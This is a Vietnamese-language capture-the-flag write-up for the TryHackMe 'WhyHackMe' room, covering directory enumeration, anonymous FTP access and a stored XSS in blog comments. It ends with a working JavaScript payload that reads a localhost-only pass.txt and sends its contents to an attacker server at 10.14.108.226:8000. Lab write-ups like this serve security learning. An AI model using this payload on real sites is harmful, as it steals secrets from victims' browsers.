# WhyHackMe-TryHackMe

recon

<img width="1273" height="629" alt="image" src="https://github.com/user-attachments/assets/871a24ad-7c08-4a74-9286-868099a95811" />

enumerating

└─$ gobuster dir -u http://10.201.5.140/ -w /usr/share/wordlists/dirb/common.txt -x php,txt

<img width="970" height="680" alt="image" src="https://github.com/user-attachments/assets/cb41927b-860f-4653-9606-d868ad661fb3" />

<img width="1278" height="766" alt="image" src="https://github.com/user-attachments/assets/b60464f7-e27e-4ffa-9d87-c34203d4486b" />

vì port 21 được mở tôi thử truy cập vào ftp với người dùng anonymous và thấy 1 tệp là update.txt

<img width="1267" height="412" alt="image" src="https://github.com/user-attachments/assets/8a8c6abc-d9d6-4265-8d5c-901ba136fc07" />

tôi thử tải về và đọc 

ở đây có một tệp có tên là pass.txt chỉ có thể truy cập được trên web cho máy cục bộ

<img width="1274" height="187" alt="image" src="https://github.com/user-attachments/assets/42972f94-ac72-4cfb-bf4f-589036dd98c1" />

tôi sẽ quay lại trang /register.php

về việc đăng ký tài khoản thì dễ dàng sau đó login vào

<img width="1282" height="618" alt="image" src="https://github.com/user-attachments/assets/7e497179-653d-4f98-a642-84152a5e5032" />

sau khi login thành công nó hiện liên kết qua trang blog 

thì sau khi đăng nhập trang blog hiển thị bình luận sau 

<img width="1265" height="773" alt="image" src="https://github.com/user-attachments/assets/ece3ce5b-0cad-4278-91a5-664c72459fb7" />

sau khi thử các mẫu XSS thành công tôi sẽ tạo 1 tập lệnh để lấy tệp pass.txt

đầu tiên tôi khởi chạy python3 -m http.server 8000

sau khi tham khảo các nguồn gợi ý thì có tập lệnh XSS như này 

fetch('http://127.0.0.1/dir/pass.txt')

  .then(response => response.text())
  
  .then(data => {
  
    let attackerServer = 'http://10.14.108.226:8000/catch?data=' + encodeURIComponent(data);
    
    // Use an Image tag for GET request
    
    let img = document.createElement('img');
    
    img.src = attackerServer;
    
    document.body.appendChild(img);
    
  });
